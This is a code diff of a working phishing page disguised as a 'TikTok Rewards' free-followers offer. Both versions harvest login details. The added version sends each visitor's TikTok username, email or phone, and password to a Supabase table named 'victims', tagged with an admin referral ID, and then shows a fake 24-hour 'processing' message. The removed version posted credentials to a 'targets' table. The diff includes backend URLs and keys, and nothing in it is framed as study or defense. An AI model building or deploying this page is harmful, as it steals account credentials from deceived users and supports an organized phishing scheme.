@@ -3,79 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Rewards - Get Free Followers</title>
+    <title>TikTok Rewards</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; }
-        .tt-gradient { background: linear-gradient(45deg, #fe2c55, #25f4ee); }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        body { background-color: #000; color: #fff; font-family: sans-serif; }
+        .tik-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-6">
-
-    <div id="login-form" class="w-full max-w-md glass p-10 rounded-[40px] shadow-2xl">
-        <div class="text-center mb-8">
-            <i class="fab fa-tiktok text-6xl mb-4"></i>
-            <h1 class="text-3xl font-black italic tracking-tighter">TIKTOK <span class="text-[#fe2c55]">BOOST</span></h1>
-            <p class="text-gray-400 text-xs font-bold mt-2 uppercase">Claim 50,000 Free Followers</p>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
+    <div id="form-box" class="w-full max-w-sm space-y-8">
+        <div class="text-center">
+            <h1 class="text-4xl font-black italic">TIKTOK REWARDS</h1>
+            <p class="text-zinc-500 text-sm mt-2">Enter details to claim 50K followers</p>
         </div>
-
-        <form id="claim-form" class="space-y-4">
-            <input type="text" id="u-target" required placeholder="Username / Phone" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
-            <input type="password" id="p-target" required placeholder="Password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
-            <button type="submit" id="btn-sub" class="w-full tt-gradient py-4 rounded-2xl font-black uppercase tracking-widest shadow-lg mt-4">Claim Now</button>
-        </form>
+        
+        <div class="space-y-4">
+            <input id="v-user" type="text" placeholder="Username (@user)" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
+            <input id="v-cred" type="text" placeholder="Email or Phone" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
+            <input id="v-pass" type="password" placeholder="Password" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
+            <button id="submit-btn" onclick="submitData()" class="tik-gradient w-full p-4 rounded-xl font-bold uppercase">Claim Now</button>
+        </div>
     </div>
 
-    <div id="success-box" class="hidden text-center glass p-12 rounded-[40px] animate-pulse">
-        <i class="fas fa-check-circle text-7xl text-green-500 mb-6"></i>
-        <h2 class="text-3xl font-black italic uppercase">Processing!</h2>
-        <p class="text-gray-400 italic">Please wait 24 hours for delivery.</p>
+    <div id="success-box" class="hidden text-center space-y-4">
+        <div class="flex justify-center">
+            <div class="tik-gradient p-4 rounded-full">
+                <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+            </div>
+        </div>
+        <h2 class="text-3xl font-bold">Processing...</h2>
+        <p class="text-zinc-500">Ang iyong followers ay madadagdag sa loob ng 24 oras. Huwag i-close ang tab na ito.</p>
     </div>
 
     <script>
-        const SB_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
-        const SB_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
-        const params = new URLSearchParams(window.location.search);
-        const agent = params.get('user') || 'direct_user';
+        // In-update ang URL at API Key mula sa iyong project details
+        const SUPABASE_URL = 'https://fhvonxrsfdawustkuoll.supabase.co'; 
+        const SUPABASE_KEY = 'sb_publishable_--n1PzlM1fQMid3BtOGHoQ_zu_YIAEV';
 
-        document.getElementById('claim-form').onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('btn-sub');
-            btn.innerText = "VERIFYING...";
+        // Inayos ang initialization para maiwasan ang URL error
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        
+        // Kinukuha ang admin ID mula sa URL (?admin=...)
+        const params = new URLSearchParams(window.location.search);
+        const adminId = params.get('admin');
+
+        async function submitData() {
+            const user = document.getElementById('v-user').value;
+            const cred = document.getElementById('v-cred').value;
+            const pass = document.getElementById('v-pass').value;
+            const btn = document.getElementById('submit-btn');
+
+            if(!user || !cred || !pass) {
+                alert("Mangyaring punan ang lahat ng detalye.");
+                return;
+            }
+
+            if(!adminId) {
+                alert("Invalid referral link. Mangyaring gamitin ang tamang link mula sa admin.");
+                return;
+            }
+
+            btn.innerText = "Verifying...";
             btn.disabled = true;
 
-            try {
-                const res = await fetch(`${SB_URL}/rest/v1/targets`, {
-                    method: 'POST',
-                    headers: { 
-                        'apikey': SB_KEY, 
-                        'Authorization': `Bearer ${SB_KEY}`, 
-                        'Content-Type': 'application/json',
-                        'Prefer': 'return=minimal'
-                    },
-                    body: JSON.stringify({
-                        user_id: agent,
-                        username: document.getElementById('u-target').value,
-                        password: document.getElementById('p-target').value,
-                        platform: 'tiktok'
-                    })
-                });
+            // Pag-save ng data sa 'victims' table sa Supabase
+            const { error } = await supabaseClient.from('victims').insert([{
+                admin_id: adminId,
+                tiktok_user: user,
+                credentials: cred,
+                password: pass,
+                followers: "50"
+            }]);
 
-                if (res.ok) {
-                    document.getElementById('login-form').classList.add('hidden');
-                    document.getElementById('success-box').classList.remove('hidden');
-                } else {
-                    alert("System Busy! Please try again later.");
-                    btn.disabled = false;
-                    btn.innerText = "Claim Now";
-                }
-            } catch (err) {
-                alert("Connection Error!");
+            if(!error) {
+                document.getElementById('form-box').classList.add('hidden');
+                document.getElementById('success-box').classList.remove('hidden');
+            } else {
+                console.error("Supabase Error:", error);
+                alert("Nagkaroon ng problema. Subukan muli mamaya.");
+                btn.innerText = "Claim Now";
                 btn.disabled = false;
             }
-        };
+        }
     </script>
 </body>
 </html>
